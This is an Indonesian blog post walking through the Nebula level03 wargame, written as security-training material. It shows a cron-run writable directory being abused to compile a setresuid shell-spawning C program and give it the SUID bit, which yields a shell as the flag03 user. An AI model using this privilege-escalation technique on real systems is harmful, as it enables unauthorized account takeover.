+++
author = "kernel-panic"
categories = ["Security", "Nebula"]
date = "2018-01-17T02:57:47+00:00"
description = "Security Wargames"
featured = "AJXP4TJl_o.jpg"
featuredalt = "Nebula Level03"
featuredpath = "https://images2.imgbox.com/7f/eb"
linktitle = ""
title = "Exploit Exercises - Nebula Level03"
type = "post"

+++
Halaman rincian untuk {{< url-link "level03" "https://exploit-exercises.com/nebula/level03/" "target">}}  berisi petunjuk yang mengarahkan kita ke direktori /home/flag03.

Setelah menavigasi ke direktori home target dan melihat apa yang ada di direktori tersebut, saya melihat sebuah skrip shell writable.sh dan sebuah direktori writable.d.

Dan saya melihat isi dari skrip shell tersebut adalah:

    #!/bin/sh
    
    for i in /home/flag03/writable.d/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done

Kode ini akan mengeksekusi sesuatu yang ditempatkan di direktori writable.d saat dipanggil. Bagian rincian juga menyebutkan crontab yang dipanggil setiap beberapa menit.

Tantangan  ini sedikit lebih sulit karena saya ingin mendapatkan akses shell dan tidak hanya mengeluarkan file log yang berisi keluaran getflag.

Setelah mencoba mendekati masalah dengan cara yang sama seperti di {{< url-link "level00" "https://muhammadzakyzulfiqor.xyz/article/nebula-level00/" "target">}} , saya menemukan solusinya yaitu "bash akan mengabaikan bit SUID".

Saya pun mencoba menggunakan pendekatan berbeda dan setelah mendapat uid/gid dari /etc/passwd, saya membuat file foo.c yang berisi beberapa kode untuk _spawn a shell_ yang saya simpan di /tmp.

    #include <stdio.h>
    
    int main()
    {
        setresuid(996, 996, 996);
        setresgid(996, 996, 996);
        system( "/bin/bash" );
        return 0;
    }

Kemudian, saya menempatkan sebuah skrip bash dalam writable.d yang akan mengkompilasi kode tersebut.

    level03@nebula:/home/flag03$ echo -e 'gcc /tmp/foo.c -o /home/flag03/level03;chmod +xs /home/flag03/level03' > /home/flag03/writable.d/bash; chmod +x /home/flag03/writable.d/bash

Saya menunggu cron berjalan, lalu mengeksekusi program level03 yang sudah dikompilasi.

    level03@nebula:/home/flag03$ ls
    level03 writable.d writable.sh
    level03@nebula:/home/flag03$ ./level03
    flag03@nebula:/home/flag03$ id
    uid=996(flag03) gid=996(flag03) groups=996(flag03),1004(level03)
    flag03@nebula:/home/flag03$ getflag
    You have successfully executed getflag on a target account

Dan berhasil!

<div class="videoyoutube"><div class="video-responsive"><iframe allowfullscreen="1" class="embedded-video-large" src="https://www.youtube.com/embed/TBNQtrBFkHY?rel=0"></iframe></div></div>